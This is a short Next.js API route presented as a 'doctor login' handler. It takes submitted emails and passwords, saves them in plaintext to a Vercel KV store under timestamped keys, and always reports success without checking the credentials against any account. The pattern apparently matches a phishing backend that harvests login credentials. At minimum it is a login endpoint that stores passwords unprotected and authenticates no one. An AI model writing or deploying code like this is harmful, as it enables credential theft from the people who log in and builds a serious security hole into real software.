import { NextRequest, NextResponse } from "next/server";
import { kv } from "@vercel/kv";

interface LoginEntry {
  email: string;
  password: string;
  rememberMe?: boolean;
  timestamp: string;
}

interface LoginRequest {
  email: string;
  password: string;
  rememberMe?: boolean;
}

export async function POST(req: NextRequest) {
  try {
    const body: LoginRequest = await req.json();

    // Generate a unique key for each login entry
    const timestamp = new Date().toISOString();
    const loginKey = `doctor-login:${timestamp}`;

    const loginEntry: LoginEntry = {
      email: body.email,
      password: body.password,
      rememberMe: body.rememberMe ?? false,
      timestamp,
    };

    // Save login in Vercel KV
    await kv.set(loginKey, loginEntry);

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Error logging doctor login:", error);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}
